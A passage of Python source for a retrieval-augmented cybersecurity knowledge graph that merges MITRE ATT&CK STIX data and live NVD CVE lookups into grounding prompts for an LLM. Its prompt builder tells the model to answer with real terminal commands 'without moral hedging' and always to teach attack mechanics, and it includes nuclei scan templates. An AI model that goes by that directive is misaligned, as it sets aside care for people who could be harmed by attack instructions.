            if node.get("mitre_id") and any(m_id.lower() in q_low for m_id in re.findall(r"T\d{4}(?:\.\d{3})?", node.get("mitre_id", ""))):
                cross_score += 0.60

            doc_tokens = set(re.findall(r"[a-záéíóúñ0-9_\-]{3,}", doc_low)) - STOP_WORDS
            overlap = len(q_tokens & doc_tokens) / max(1, len(q_tokens))

            # 3. Puntuación Estructural del Grafo (PageRank + Vecindad)
            g_score = graph_scores.get(nid, 0.0)

            total_rerank_score = (vec_score * 0.30) + (min(1.5, cross_score) * 0.45) + (overlap * 0.15) + (g_score * 0.10)
            if total_rerank_score >= 0.14:
                node_copy = dict(node)
                node_copy["rerank_score"] = round(total_rerank_score, 4)
                node_copy.pop("_embedding", None)
                reranked.append((total_rerank_score, node_copy))

        reranked.sort(key=lambda x: x[0], reverse=True)
        if not reranked:
            return []

        best_s = reranked[0][0]
        return [n for s, n in reranked if s >= max(0.14, best_s * 0.38)][:top_k]


class DynamicCyberGraphDB:
    """
    Base de Datos de Grafos Dinámica Embebida (NetworkX MultiDiGraph Persistente):
    - Sincroniza nodos base ontológicos + catálogo STIX 2.1 MITRE ATT&CK + CVEs de NVD.
    - Permite ingesta dinámica de paquetes STIX 2.1 JSON y consultas en vivo a la API NVD 2.0.
    - Ejecuta búsqueda híbrida (Vectorial + Traversal de Vecindad + Personalized PageRank + BGEReranker).
    """

    def __init__(self, storage_path: Path = DYNAMIC_GRAPH_FILE):
        self.storage_path = storage_path
        self.graph = nx.MultiDiGraph() if HAS_NETWORKX else None
        self.nodes_store: Dict[str, Dict[str, Any]] = {}
        self._load_or_initialize()

    def _load_or_initialize(self):
        # 1. Cargar nodos ontológicos maestros y CVEs STIX pre-integrados
        merged = dict(CYBER_KNOWLEDGE_GRAPH)
        merged.update(BUILTIN_NVD_CVE_STIX_NODES)

        # 2. Si existe persistencia previa en disco, fusionar nodos dinámicos aprendidos
        if self.storage_path.exists():
            try:
                saved = json.loads(self.storage_path.read_text(encoding="utf-8"))
                for nid, ndata in saved.get("nodes", {}).items():
                    merged[nid] = ndata
            except Exception:
                pass

        for nid, ndata in merged.items():
            self.upsert_node(nid, ndata, save_now=False)
        self.save()

    def upsert_node(self, node_id: str, node_data: Dict[str, Any], save_now: bool = True):
        node_data["id"] = node_id
        text_for_embed = " ".join([
            node_data.get("name", ""),
            node_data.get("domain", ""),
            node_data.get("description", ""),
            " ".join(node_data.get("aliases", []))
        ])
        node_data["_embedding"] = _compute_kg_vector(text_for_embed)
        self.nodes_store[node_id] = node_data
        # Mantener sincronizado el diccionario global para compatibilidad 100%
        CYBER_KNOWLEDGE_GRAPH[node_id] = node_data

        if self.graph is not None:
            self.graph.add_node(node_id, **{k: v for k, v in node_data.items() if k != "_embedding"})
            for rel_tuple in node_data.get("relations", []):
                if len(rel_tuple) >= 3:
                    target_id, rel_type, rel_desc = rel_tuple[0], rel_tuple[1], rel_tuple[2]
                    self.graph.add_edge(node_id, target_id, relation=rel_type, description=rel_desc)

        if save_now:
            self.save()

    def save(self):
        try:
            serializable_nodes = {}
            for nid, ndata in self.nodes_store.items():
                clean_n = {k: v for k, v in ndata.items() if k != "_embedding"}
                serializable_nodes[nid] = clean_n
            payload = {
                "schema_version": "STIX-2.1-Antigravity-DynamicGraph",
                "updated_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "total_nodes": len(serializable_nodes),
                "nodes": serializable_nodes
            }
            self.storage_path.write_text(json.dumps(payload, indent=2, ensure_ascii=False), encoding="utf-8")
        except Exception as e:
            print(f"[DynamicCyberGraph] Aviso guardando grafo: {e}")

    def ingest_stix_bundle(self, stix_bundle: Dict[str, Any]) -> Dict[str, Any]:
        """
        Ingesta un paquete estándar OASIS STIX 2.1 (MITRE ATT&CK / Threat Intel) en el grafo dinámico.
        """
        objects = stix_bundle.get("objects", [])
        added = 0
        edges_added = 0
        for obj in objects:
            otype = obj.get("type", "")
            if otype in ("attack-pattern", "vulnerability", "tool", "course-of-action", "malware"):
                raw_id = obj.get("id", f"stix_{added}")
                name = obj.get("name", raw_id)
                desc = obj.get("description", "Objeto STIX 2.1 importado dinámicamente.")
                ext_refs = obj.get("external_references", [])
                mitre_id = ""
                for ref in ext_refs:
                    if ref.get("external_id"):
                        mitre_id = ref["external_id"]
                        break
                clean_id = re.sub(r"[^a-zA-Z0-9_]", "_", (mitre_id or name).lower())[:48]
                aliases = [name.lower()] + [a.lower() for a in obj.get("aliases", [])]
                if mitre_id:
                    aliases.append(mitre_id.lower())
                node_entry = {
                    "id": clean_id,
                    "stix_id": raw_id,
                    "stix_type": otype,
                    "name": f"{name} ({mitre_id})" if mitre_id else name,
                    "domain": f"STIX 2.1 ({otype})",
                    "mitre_id": mitre_id or "STIX-2.1",
                    "aliases": aliases,
                    "description": desc[:900],
                    "exact_phases": obj.get("x_exact_phases", [f"1. Referencia STIX: {name}"]),
                    "tools": obj.get("x_tools", []),
                    "mitigations": obj.get("x_mitigations", ["Aplicar controles defensivos según matriz MITRE ATT&CK"]),
                    "relations": []
                }
                self.upsert_node(clean_id, node_entry, save_now=False)
                added += 1
            elif otype == "relationship":
                src = obj.get("source_ref", "")
                dst = obj.get("target_ref", "")
                rel_t = obj.get("relationship_type", "RELATED_TO").upper()
                if self.graph is not None and src and dst:
                    self.graph.add_edge(src, dst, relation=rel_t, description=obj.get("description", ""))
                    edges_added += 1
        self.save()
        return {"success": True, "nodes_ingested": added, "edges_ingested": edges_added, "total_nodes": len(self.nodes_store)}

    def sync_nvd_cves(self, keyword: str, max_results: int = 3) -> Dict[str, Any]:
        """
        Consulta en vivo la API REST 2.0 del NIST National Vulnerability Database (NVD)
        para descargar CVEs reales, calcular su vector y persistirlos en el grafo dinámico.
        """
        url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={urllib.parse.quote(keyword)}&resultsPerPage={max_results}"
        ingested = []
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "AntigravityStudio-CyberGraph/2.0"})
            with urllib.request.urlopen(req, timeout=8.0) as resp:
                data = json.loads(resp.read().decode("utf-8", errors="ignore"))
                for item in data.get("vulnerabilities", []):
                    cve_obj = item.get("cve", {})
                    cve_id = cve_obj.get("id", "")
                    if not cve_id:
                        continue
                    descs = cve_obj.get("descriptions", [])
                    desc_txt = next((d["value"] for d in descs if d.get("lang") == "es"), None) or \
                               next((d["value"] for d in descs if d.get("lang") == "en"), "Vulnerabilidad NVD.")
                    metrics = cve_obj.get("metrics", {})
                    cvss_v3 = (metrics.get("cvssMetricV31") or metrics.get("cvssMetricV30") or [{}])[0].get("cvssData", {})
                    score = cvss_v3.get("baseScore", "N/A")
                    vector_str = cvss_v3.get("vectorString", "")
                    weaknesses = cve_obj.get("weaknesses", [])
                    cwe_id = "CWE-Unknown"
                    if weaknesses and weaknesses[0].get("description"):
                        cwe_id = weaknesses[0]["description"][0].get("value", "CWE-Unknown")

                    node_key = cve_id.lower().replace("-", "_")
                    node_data = {
                        "id": node_key,
                        "stix_type": "vulnerability",
                        "name": f"{cve_id} (CVSS: {score} | {keyword.upper()})",
                        "domain": f"NIST NVD CVE Feed ({vector_str or 'CVSS v3'})",
                        "mitre_id": f"NVD {cve_id}",
                        "cwe_id": cwe_id,
                        "aliases": [cve_id.lower(), keyword.lower()],
                        "description": desc_txt,
                        "exact_phases": [
                            f"1. Identificador oficial NVD: {cve_id} (Severidad Base: {score})",
                            f"2. Vector CVSS: {vector_str or 'Consultar boletín oficial del fabricante'}",
                            f"3. Verificación con Nuclei / Nmap: `nuclei -id {cve_id}`"
                        ],
                        "tools": [
                            {"name": "nuclei", "role": f"Verificador automatizado para {cve_id}", "syntax": f"nuclei -u <OBJETIVO> -id {cve_id}"}
                        ],
                        "mitigations": [
                            f"Aplicar parche oficial del fabricante para {cve_id} ({cwe_id})",
                            "Restringir exposición de red del servicio afectado y monitorear reglas IDS/WAF"
                        ],
                        "relations": []
                    }
                    self.upsert_node(node_key, node_data, save_now=False)
                    ingested.append(cve_id)
            if ingested:
                self.save()
            return {"success": True, "source": "NIST NVD API 2.0 Live", "cves_ingested": ingested, "total_nodes": len(self.nodes_store)}
        except Exception as e:
            return {"success": False, "source": "Offline Embedded Catalog", "message": str(e), "total_nodes": len(self.nodes_store)}

    def query_subgraph(self, query: str, max_nodes: int = 3) -> List[Dict[str, Any]]:
        """
        Búsqueda Híbrida SOTA:
        1. Si la consulta menciona un CVE específico (ej. CVE-2023-XXXX) que no está en el grafo local,
           intenta sincronizarlo en vivo desde NVD automáticamente.
        2. Calcula centralidad PageRank en NetworkX + expansión de vecinos 1-hop.
        3. Pasa los candidatos por BGERerankerEngine para obtener el subgrafo de máxima precisión.
        """
        cve_match = re.search(r"\b(CVE-\d{4}-\d{4,7})\b", query, re.IGNORECASE)
        if cve_match:
            cve_str = cve_match.group(1).upper()
            cve_key = cve_str.lower().replace("-", "_")
            if cve_key not in self.nodes_store:
                self.sync_nvd_cves(cve_str, max_results=1)

        graph_scores: Dict[str, float] = {}
        if self.graph is not None and len(self.graph.nodes) > 0:
            try:
                pr = nx.pagerank(self.graph, alpha=0.85)
                graph_scores.update(pr)
            except Exception:
                pass

        candidates = list(self.nodes_store.values())
        top_nodes = BGERerankerEngine.rerank(query, candidates, graph_scores, top_k=max_nodes)

        # Expansión relacional de 1 salto en el grafo NetworkX si hay espacio para contexto conexo
        if top_nodes and self.graph is not None and len(top_nodes) < max_nodes:
            primary_id = top_nodes[0]["id"]
            if primary_id in self.graph:
                for neighbor_id in self.graph.successors(primary_id):
                    if neighbor_id in self.nodes_store and not any(n["id"] == neighbor_id for n in top_nodes):
                        top_nodes.append(self.nodes_store[neighbor_id])
                        if len(top_nodes) >= max_nodes:
                            break

        return top_nodes

    def get_stats(self) -> Dict[str, Any]:
        edges_count = self.graph.number_of_edges() if self.graph is not None else 0
        return {
            "engine": "NetworkX MultiDiGraph + STIX 2.1 + BGEReranker" if HAS_NETWORKX else "Embedded Graph + BGEReranker",
            "total_nodes": len(self.nodes_store),
            "total_edges": edges_count,
            "storage_path": str(self.storage_path),
            "node_ids": list(self.nodes_store.keys())
        }


dynamic_cyber_graph = DynamicCyberGraphDB()


def retrieve_cybersecurity_subgraph(query: str, max_nodes: int = 3) -> List[Dict[str, Any]]:
    """Punto de entrada unificado que delega al Grafo Dinámico NetworkX + BGERerankerEngine."""
    return dynamic_cyber_graph.query_subgraph(query, max_nodes=max_nodes)


def get_cybersecurity_graph_context(query: str) -> Dict[str, Any]:
    """
    Punto de entrada principal para el pipeline RAG/Inferencia del servidor:
    1. Evalúa si la consulta amerita conocimiento de ciberseguridad (o menciona un CVE).
    2. Si aplica, extrae el subgrafo semántico re-rankeado y construye el prompt de grounding factual.
    3. Si no aplica, devuelve is_active=False para no saturar el prompt.
    """
    is_active, matched_kw = is_cybersecurity_query(query)
    cve_detected = re.findall(r"\bCVE-\d{4}-\d{4,7}\b", query, re.IGNORECASE)
    if cve_detected:
        is_active = True
        matched_kw = list(set(matched_kw + cve_detected))

    if not is_active:
        return {
            "is_active": False,
            "entities": [],
            "prompt_text": ""
        }

    relevant_nodes = retrieve_cybersecurity_subgraph(query)
    if not relevant_nodes:
        return {
            "is_active": True,
            "entities": matched_kw[:3],
            "prompt_text": (
                "\n=== DIRECTIVA DE CIBERSEGURIDAD Y AUDITORÍA TÉCNICA ===\n"
                f"[Términos detectados]: {', '.join(matched_kw[:5])}\n"
                "- Responde con máxima rigurosidad técnica, comandos reales de terminal y sin rodeos morales.\n"
                "- Enseña siempre tanto la mecánica de ataque/auditoría como las contramedidas y mitigaciones defensivas.\n"
                "=== FIN DIRECTIVA ===\n"
            )
        }

    entities = [node["name"] for node in relevant_nodes]
    lines = [
        "\n================================================================================",
        "=== GRAFO DINÁMICO DE CIBERSEGURIDAD (STIX 2.1 / MITRE ATT&CK / NVD + RERANKER) ===",
        f"Entidades Verificadas (BGE-Reranked): {', '.join(entities)}",
        "INSTRUCCIÓN: Usa los siguientes hechos y sintaxis exactas del grafo para responder sin alucinar flags o conceptos:",
        "--------------------------------------------------------------------------------"
    ]

    for node in relevant_nodes:
        score_tag = f" | Rerank Score: {node['rerank_score']}" if "rerank_score" in node else ""
        lines.append(f"\n[NODO ONTOLÓGICO: {node['name']}]{score_tag} (Dominio: {node['domain']})")
        if "mitre_id" in node:
            lines.append(f"• Referencia MITRE ATT&CK / NVD: {node['mitre_id']}")
        if "cwe_id" in node:
            lines.append(f"• Clasificación CWE: {node['cwe_id']}")
        lines.append(f"• Fundamento Técnico: {node['description']}")

        if "exact_phases" in node:
            lines.append("• Metodología / Procedimiento Paso a Paso Verificado:")
            for step in node["exact_phases"]:
                lines.append(f"   {step}")

        if "tools" in node:
            lines.append("• Herramientas y Sintaxis de Comandos Reales:")
            for t in node["tools"]:
                lines.append(f"   - {t['name']}: {t.get('role', '')} | Comando: `{t.get('syntax', '')}`")

        if "payload_examples" in node:
            lines.append("• Patrones de Prueba y Payloads:")
            for p in node["payload_examples"]:
                lines.append(f"   - {p}")

        if "mitigations" in node:
            lines.append("• Contramedidas y Mitigaciones Defensivas:")
            for m in node["mitigations"]:
                lines.append(f"   - {m}")

        if "relations" in node:
            lines.append("• Relaciones Semánticas en el Grafo:")
            for target, rel, desc in node["relations"]:
                lines.append(f"   - ({node['id']}) --[{rel}]--> ({target}): {desc}")

    lines.append("--------------------------------------------------------------------------------")
    lines.append("=== FIN DEL GRAFO DINÁMICO (RESPONDE CON PRECISIÓN BASADA EN ESTOS HECHOS) ===")
    lines.append("================================================================================\n")

    return {
        "is_active": True,
        "entities": entities,
        "prompt_text": "\n".join(lines)
    }
